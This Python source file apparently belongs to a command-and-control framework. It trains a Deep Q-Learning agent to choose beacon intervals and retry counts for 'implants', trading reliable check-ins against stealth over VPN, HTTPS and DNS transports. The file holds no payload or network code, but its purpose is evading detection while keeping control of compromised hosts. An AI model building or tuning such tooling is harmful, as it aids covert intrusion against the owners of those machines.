"""
RL Beacon Timing Optimizer

Learns optimal beacon timing for implants using Deep Q-Learning (DQN).
Optimizes for connectivity while minimizing noise.

State space: [hour, day_of_week, recent_success_rate, uptime, last_beacon_age, transport_idx]
Action space: beacon_interval (6 options) + retry_count (4 options) = 24 total actions
"""

import torch
import torch.nn as nn
import torch.optim as optim
from collections import deque
import numpy as np
from datetime import datetime
import json

# =========================================================================
# CONFIG
# =========================================================================

BEACON_INTERVALS = [5, 10, 30, 60, 120, 300]  # seconds
RETRY_COUNTS = [1, 2, 3, 5]
TRANSPORTS = ["vpn", "https", "dns"]

STATE_DIM = 6  # hour, dow, success_rate, uptime, beacon_age, transport
ACTION_DIM = len(BEACON_INTERVALS) * len(RETRY_COUNTS)  # 6 * 4 = 24
HIDDEN_DIM = 128

LEARNING_RATE = 1e-3
GAMMA = 0.99  # discount factor
EPSILON_START = 1.0
EPSILON_END = 0.01
EPSILON_DECAY = 0.995
BATCH_SIZE = 32
MEMORY_SIZE = 10000
UPDATE_FREQUENCY = 100

# =========================================================================
# DQN Network
# =========================================================================

class DQNNetwork(nn.Module):
    """Deep Q-Network for beacon timing optimization"""

    def __init__(self, state_dim, action_dim, hidden_dim=128):
        super(DQNNetwork, self).__init__()
        self.net = nn.Sequential(
            nn.Linear(state_dim, hidden_dim),
            nn.ReLU(),
            nn.Linear(hidden_dim, hidden_dim),
            nn.ReLU(),
            nn.Linear(hidden_dim, action_dim)
        )

    def forward(self, state):
        return self.net(state)


# =========================================================================
# RL Agent
# =========================================================================

class BeaconRLAgent:
    """Reinforcement Learning agent for optimal beacon timing"""

    def __init__(self, state_dim=STATE_DIM, action_dim=ACTION_DIM, device="cpu"):
        self.device = torch.device(device)
        self.state_dim = state_dim
        self.action_dim = action_dim

        # Networks
        self.q_network = DQNNetwork(state_dim, action_dim, HIDDEN_DIM).to(self.device)
        self.target_network = DQNNetwork(state_dim, action_dim, HIDDEN_DIM).to(self.device)
        self.target_network.load_state_dict(self.q_network.state_dict())

        # Optimizer
        self.optimizer = optim.Adam(self.q_network.parameters(), lr=LEARNING_RATE)
        self.loss_fn = nn.MSELoss()

        # Experience replay
        self.memory = deque(maxlen=MEMORY_SIZE)

        # Training metrics
        self.epsilon = EPSILON_START
        self.step_count = 0
        self.training_losses = []
        self.episode_rewards = []
        self.current_episode_reward = 0.0
        self.successful_beacons = 0
        self.failed_beacons = 0

    def get_state_vector(self, implant_data: dict) -> torch.Tensor:
        """Convert implant data to normalized state vector"""
        now = datetime.now()
        hour = now.hour / 24.0
        dow = now.weekday() / 7.0
        success_rate = implant_data.get("success_rate", 0.5)
        uptime = implant_data.get("uptime", 0.5)
        last_beacon_age = min(implant_data.get("seconds_since_beacon", 300), 600) / 600.0
        transport_idx = TRANSPORTS.index(implant_data.get("transport", "vpn")) / len(TRANSPORTS)

        state = torch.tensor(
            [hour, dow, success_rate, uptime, last_beacon_age, transport_idx],
            dtype=torch.float32,
            device=self.device
        )
        return state

    def select_action(self, state: torch.Tensor, training=True) -> dict:
        """Select beacon action using epsilon-greedy policy"""
        if training and np.random.random() < self.epsilon:
            action_idx = np.random.randint(0, self.action_dim)
        else:
            with torch.no_grad():
                q_values = self.q_network(state.unsqueeze(0))
                action_idx = q_values.argmax(dim=1).item()

        # Decode action to beacon params
        beacon_interval_idx = action_idx // len(RETRY_COUNTS)
        retry_count_idx = action_idx % len(RETRY_COUNTS)

        return {
            "action_idx": action_idx,
            "beacon_interval": BEACON_INTERVALS[beacon_interval_idx],
            "retry_count": RETRY_COUNTS[retry_count_idx],
            "transport": "vpn"  # Could also be learned
        }

    def compute_reward(self, beacon_success: bool, beacon_interval: int,
                      response_time: float = 0.0) -> float:
        """Compute reward for beacon action

        Rewards:
            +10 for successful beacon
            -5 for failed beacon
            -0.1 per second of interval (penalty for noise)
            +bonus for fast response
        """
        reward = 0.0

        if beacon_success:
            reward += 10.0
            self.successful_beacons += 1
            # Bonus for fast response (< 1 second)
            if response_time < 1.0:
                reward += 2.0
        else:
            reward -= 5.0
            self.failed_beacons += 1

        # Penalize excessive beacon intervals (stealth trade-off)
        reward -= (beacon_interval / 60.0) * 0.1  # Small penalty for long intervals

        self.current_episode_reward += reward
        return reward

    def store_experience(self, state: torch.Tensor, action_idx: int,
                        reward: float, next_state: torch.Tensor, done: bool):
        """Store experience in replay buffer"""
        self.memory.append((state, action_idx, reward, next_state, done))

    def train_step(self) -> float:
        """Train network on batch from replay buffer"""
        if len(self.memory) < BATCH_SIZE:
            return 0.0

        # Sample batch
        batch = np.random.choice(len(self.memory), BATCH_SIZE, replace=False)
        states, actions, rewards, next_states, dones = zip(*[self.memory[i] for i in batch])

        states = torch.stack(states).to(self.device)
        actions = torch.tensor(actions, dtype=torch.long, device=self.device)
        rewards = torch.tensor(rewards, dtype=torch.float32, device=self.device)
        next_states = torch.stack(next_states).to(self.device)
        dones = torch.tensor(dones, dtype=torch.float32, device=self.device)

        # Compute Q-learning loss
        q_values = self.q_network(states)
        q_values = q_values.gather(1, actions.unsqueeze(1)).squeeze(1)

        with torch.no_grad():
            next_q_values = self.target_network(next_states).max(dim=1)[0]
            target_q_values = rewards + GAMMA * next_q_values * (1 - dones)

        loss = self.loss_fn(q_values, target_q_values)

        self.optimizer.zero_grad()
        loss.backward()
        torch.nn.utils.clip_grad_norm_(self.q_network.parameters(), 1.0)
        self.optimizer.step()

        # Update target network
        if self.step_count % UPDATE_FREQUENCY == 0:
            self.target_network.load_state_dict(self.q_network.state_dict())

        # Decay epsilon
        self.epsilon = max(EPSILON_END, self.epsilon * EPSILON_DECAY)
        self.step_count += 1

        self.training_losses.append(loss.item())
        return loss.item()

    def get_metrics(self) -> dict:
        """Get training metrics for TUI display"""
        avg_loss = np.mean(self.training_losses[-100:]) if self.training_losses else 0.0
        success_rate = (
            self.successful_beacons / (self.successful_beacons + self.failed_beacons)
            if (self.successful_beacons + self.failed_beacons) > 0 else 0.0
        )

        return {
            "step_count": self.step_count,
            "epsilon": self.epsilon,
            "avg_loss": avg_loss,
            "success_rate": success_rate,
            "successful_beacons": self.successful_beacons,
            "failed_beacons": self.failed_beacons,
            "memory_size": len(self.memory),
            "current_episode_reward": self.current_episode_reward,
        }

    def save(self, path: str):
        """Save model checkpoint"""
        torch.save({
            "q_network": self.q_network.state_dict(),
            "target_network": self.target_network.state_dict(),
            "optimizer": self.optimizer.state_dict(),
            "epsilon": self.epsilon,
            "step_count": self.step_count,
        }, path)

    def load(self, path: str):
        """Load model checkpoint"""
        checkpoint = torch.load(path, map_location=self.device)
        self.q_network.load_state_dict(checkpoint["q_network"])
        self.target_network.load_state_dict(checkpoint["target_network"])
        self.optimizer.load_state_dict(checkpoint["optimizer"])
        self.epsilon = checkpoint["epsilon"]
        self.step_count = checkpoint["step_count"]


# =========================================================================
# Global Agent Instance
# =========================================================================

_agent = None

def get_agent() -> BeaconRLAgent:
    """Get or create global RL agent"""
    global _agent
    if _agent is None:
        _agent = BeaconRLAgent(device="cuda" if torch.cuda.is_available() else "cpu")
    return _agent

def reset_agent():
    """Reset agent (for testing)"""
    global _agent
    _agent = None
